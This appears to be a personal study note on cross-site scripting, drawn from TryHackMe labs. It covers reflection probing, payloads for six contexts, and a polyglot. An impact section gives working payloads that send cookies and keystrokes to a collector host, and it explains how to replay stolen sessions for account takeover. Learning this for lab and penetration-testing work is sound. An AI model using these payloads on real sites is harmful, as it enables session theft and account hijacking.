---
type: technique
platform: web
status: working
fluency: guided
source: thm
updated: 2026-08-30
---

# Cross-Site Scripting (XSS)

Your input ends up in a page that somebody's browser executes. Whether that is exploitable, and with which payload, is decided entirely by **where** in the document your input lands — the HTML body, an attribute value, inside a `<script>` block, inside a `<textarea>`. There is no universal [[Security-Terms#^xss|XSS]] payload, and trying a list of them against an unknown context is the slowest possible way to work.

So the method is always the same two moves: get a marker to reflect, then read the source around it. Everything else in this note follows from what you see there.

## Find where your input lands

**Why now** — you have an input that appears somewhere in a response: a search box, a name field, a URL parameter, a header the page prints. Before choosing any payload you need the surrounding characters, because those decide what you must close before your code can run.

```text
zzprobe7f31'"><svg
```

Then read the raw response, not the rendered page:

```bash
curl -s 'http://target.thm/search?q=zzprobe7f31%27%22%3E%3Csvg' | grep -n -C2 zzprobe7f31
```

- a unique alphanumeric marker → `zzprobe7f31` appears nowhere else in the document, so `grep` finds every reflection point at once. `test` or `XSS` collide with the page's own content
- `'"><` in one probe → each character tests a different escape, and the response tells you which ones survived. This one string answers "am I in an attribute", "am I in a string", "can I open a tag" in a single request
- `curl` and `grep -C2`, not the browser → **the step that is easy to skip and costs the most.** The rendered DOM shows you what the browser made of the page; view-source and `curl` show what the server actually sent. An escaped `&lt;` looks identical to a working `<` in the rendered view, and that difference is the entire question
- URL-encode the probe for transport (`%27%22%3E`), or the shell and the server will each eat part of it
- check every reflection point — the same input often lands in three places with three different encodings, and only one of them is exploitable

**What you will see**

- **Found** — your marker in the source with the special characters **intact**, exactly as you sent them. That is a live injection point, and the characters surrounding it name the context.
- **Empty** — the marker does not appear at all. Either the field is not reflected on this page, or it is **stored** and reflected somewhere else — an admin panel, a profile page, a log viewer. A stored payload shows nothing on the request that submits it and everything on the page that renders it later, so a quiet response here is not a negative result.
- **Error** — a 400 or a [[Security-Terms#^waf|WAF]] block page on the probe itself means the characters are being rejected in transit rather than escaped in output. That is a filter to work around, not an absence of reflection.
- **Noise** — the marker present but with `&lt;`, `&gt;`, `&quot;`, `&#39;` in place of your characters is correct output encoding, and that reflection point is not exploitable however many payloads you try. Reflection is not injection.

**Then** — intact characters send you to the matching context below. Encoded characters send you to the *other* reflection points, and then to other inputs. No reflection at all means look for the stored case: submit a marker, then browse every page that might display it.

## Pick the payload from the context

**Why now** — you know exactly what surrounds your input. Each context needs a different set of characters closed before your script can start, and the payload is mechanical once you have read the source.

```html
<script>alert(1)</script>                      <!-- 1: loose in the HTML body -->
"><script>alert(1)</script>                    <!-- 2: inside an attribute value -->
</textarea><script>alert(1)</script>           <!-- 3: inside a textarea -->
';alert(1);//                                  <!-- 4: inside an existing JS string -->
<sscriptcript>alert(1)</sscriptcript>          <!-- 5: naive one-pass word filter -->
x" onload="alert(1)                            <!-- 6: < and > filtered, attribute reachable -->
```

- **1 — HTML body.** Nothing to escape; the tag runs as written. If this fails while the marker reflected cleanly, a Content-Security-Policy is the usual reason
- **2 — attribute value.** `"` closes the value, `>` closes the tag, then a fresh tag runs. Check which quote the attribute actually uses: a `'`-quoted attribute needs `'>`, and using the wrong one is a silent no-op
- **3 — textarea.** Its content is literal text, so you must close the element first. The same applies inside `<title>`, `<style>` and comments, each with its own closing tag
- **4 — inside JavaScript.** `'` closes the string literal, `;` ends the statement, `//` comments out the remainder so the original line does not throw a syntax error. **Omit the `//` and the broken tail can abort the whole script block before your code runs** — which looks exactly like a failed injection
- **5 — one-pass word filter.** A filter that removes `script` once, without repeating, leaves `<script>` behind when the word is nested inside itself. A filter that loops until no match remains defeats this entirely, so this is a probe of the filter's design as much as a payload
- **6 — characters filtered, not words.** With `<` and `>` gone you cannot create a tag, so use one that already exists: break out of its attribute and add an event handler. `onload`, `onerror`, `onfocus autofocus`, `onmouseover` are the usual four
- swap `alert(1)` for `alert(document.domain)` → it prints which origin executed, which matters when the page embeds frames from elsewhere and you cannot otherwise tell whose context you are in

**What you will see**

- **Found** — the alert fires. That is proof of execution in that context, and it is the moment the finding becomes real.
- **Empty** — nothing happens and the page looks normal. Read the source again around the marker: usually one character of your payload was escaped, or you closed the wrong quote, or you are in context 4 and the missing `//` killed the block. Check the browser console for a `SyntaxError` or a [[Security-Terms#^csp|CSP]] violation before changing payloads — the console usually names the exact problem.
- **Error** — a console message reading `Refused to execute inline script because it violates the following Content Security Policy directive` is a definitive answer: the injection works and CSP is blocking it, which is a different and much harder problem than filtering. A 403 on submission is a WAF, upstream of the application.
- **Noise** — an alert triggered by the site's own JavaScript, or by a browser extension. And the reverse trap: your payload landing in an HTML comment or inside an inert `<template>`, where it reflects perfectly and can never execute.

**Then** — a firing alert in a context you control goes to the impact section below; an alert is a proof of concept and nothing more, and the note is not finished until you have said what an attacker gains. Escaping in every context means this input is safe — move to the next input. A CSP block means read the policy header itself for the gap (`unsafe-inline`, a whitelisted [[Security-Terms#^cdn|CDN]], a `jsonp` endpoint) rather than trying more payloads.

## When you do not know the context yet

**Why now** — an unfamiliar form with many fields, and reading the source around each one costs more time than you want to spend on a first pass. A polyglot is a single string built to execute in several contexts at once, so one submission per field tells you which fields are worth studying.

```text
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

- keep it in a fenced block → it contains backticks of its own, and inline code formatting breaks the payload silently
- mixed case (`jaVasCript`, `oNcliCk`) → defeats case-sensitive blocklists; HTML and JS do not care
- the closing tags in the middle → each one escapes a different container, which is what makes one string work in several places
- swap `alert()` for a distinguishable marker such as `alert(1)` in field one, `alert(2)` in field two → with several fields in play, an alert with no identity tells you something fired but not what. **The omission that turns a successful sweep into a second sweep**

**What you will see**

- **Found** — an alert fires from one of the fields. You now know which field to study, and you go back to the previous section to build a targeted payload for its actual context.
- **Empty** — no alert from any field. This is weak evidence, not a clean bill of health: a polyglot trades reliability for coverage, and plenty of exploitable contexts do not match it. Fall back to the marker-and-read-source method on each field.
- **Error** — the application rejecting the input for length or for format is common; the polyglot is long and full of punctuation. Shorten to a per-context payload instead.
- **Noise** — the string reflecting harmlessly into several places at once makes the source hard to read afterwards. Use the plain marker for locating, and the polyglot only for firing.

**Then** — a hit goes back to the context section for a clean, reliable payload. No hit sends you to the systematic method, field by field.

## Turn it into impact

**Why now** — you have proven execution. `alert(1)` demonstrates nothing to anyone reading a report, and more importantly it does not tell *you* whether the finding is worth pursuing. These are the three things the execution is actually for.

```html
<script>fetch('https://collector.thm/s?c='+btoa(document.cookie))</script>
<script>document.onkeypress=function(e){fetch('https://collector.thm/k?k='+btoa(e.key))}</script>
<script>user.changeEmail('attacker@collector.thm')</script>
```

- **session theft** — `document.cookie` gives you the victim's session, and `btoa()` base64s it so that cookie characters survive the URL. The critical limitation: a cookie with the `HttpOnly` flag is invisible to JavaScript and this payload returns an empty string. Check the `Set-Cookie` header before spending time here
- **key logging** — catches credentials that never reach a cookie, which is the answer when `HttpOnly` closes the route above. Needs the victim to stay on the page and type
- **application actions** — the most valuable and the most target-specific. Your script runs as the victim, so it can call whatever the application's own JavaScript can: change an email, create a user, approve a request. Read the site's own JS to find the function names
- your collector must be reachable from the victim's browser, and you must be watching it. A request that arrives while nothing is listening is a finding you will never know you got
- stored XSS is what makes these worth anything — a reflected payload requires you to deliver the URL to a victim, while a stored one waits for them

**What you will see**

- **Found** — a request arriving at your collector carrying a base64 blob. Decode it; a valid session cookie can be replayed directly.
- **Empty** — the payload fired (you saw the alert) but nothing arrives. Either `HttpOnly` is set and there was nothing to send, or the browser blocked the outbound request under CSP `connect-src`, or nobody has visited the page yet. For stored XSS on an admin-viewed page, waiting is part of the technique.
- **Error** — a console `CORS` message is usually irrelevant here: `fetch` still leaves the browser, the response is simply unreadable, and your collector logs the hit regardless. A `connect-src` CSP violation is the one that genuinely stops the request.
- **Noise** — your own testing hitting the collector. Log the source address and the User-Agent so you can tell your browser from the victim's.

**Then** — a captured session cookie goes to [[Authentication-Attacks]] as account takeover, and to [[Burp-Suite]] to replay it against the application. An application action that changes state is often the stronger finding: chain it to a password reset or a privilege change and the account is yours without a cookie at all.

## Reading the output

Everything in this note is decided by one thing: the exact bytes the server sent, around your marker. The rendered page lies to you about encoding, and the DOM lies to you about what came from the server versus what the page's own JavaScript built afterwards. When a payload does not fire and you cannot say why, the answer is nearly always visible in view-source and in the browser console, and nearly never in another payload.

The second whole-note point is timing. Reflected XSS answers on the request that carries it; stored XSS answers on a **later** page load, possibly by a different user, possibly minutes later. So a silent response to a stored payload is not a result yet — the test is not finished until you have loaded the page that renders saved input. Submitting a marker into every field and then browsing the whole application looking for it is a slower loop than the reflected case, and skipping it is how stored XSS gets missed.

## Next

- [[Burp-Suite]] — replaying and tampering the requests that carry the payload
- [[Authentication-Attacks]] — session-cookie theft is how reflected XSS becomes account takeover

## Gaps

- DOM-based XSS is not covered: the payload never reaches the server, the sink is in the page's own JavaScript, and none of the source-reading method above finds it.
- Nothing on reading a CSP header to find its gap, which is the deciding question on any modern target.
- No coverage of blind XSS — a payload that fires in an interface you cannot see, such as an admin log viewer, and needs an out-of-band collector to detect at all.
- Nothing on filter evasion beyond contexts 5 and 6: no HTML entity, unicode, or `srcdoc` variants.
